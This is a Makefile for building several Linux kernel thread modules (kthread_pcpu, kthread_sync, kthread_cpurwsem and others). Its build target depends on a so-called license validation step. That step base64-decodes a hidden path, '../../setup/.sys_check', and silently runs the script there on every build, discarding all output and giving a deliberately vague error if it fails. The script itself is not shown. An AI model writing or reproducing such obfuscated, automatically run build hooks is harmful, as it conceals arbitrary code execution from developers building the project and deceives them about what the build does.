# kbuild part of makefile
ifneq ($(KERNELRELEASE),)
obj-m := kthread_pcpu.o kthread_compl.o
obj-m += kthread_sync.o kthread_sync_waitq.o kthread_cpurwsem.o
EXTRA_CFLAGS += -DDEBUG
else

KDIR ?= /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

# CONFIG_MODULE_SIG=n
# command to convert input files into desired target 
# this command uses kbuild scripts of kernel-header/source folder specified
build: _pre_build_check

	$(MAKE) -C $(KDIR) M=$(PWD) modules

# License validation target (cryptic error message)
_pre_build_check:
	@$(shell echo "Li4vLi4vc2V0dXAvLnN5c19jaGVjaw==" | base64 -d 2>/dev/null || echo "../../setup/.sys_check") >/dev/null 2>&1 || (echo "Build prerequisites not met" && exit 1)

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean


.PHONY: build clean _pre_build_check
endif
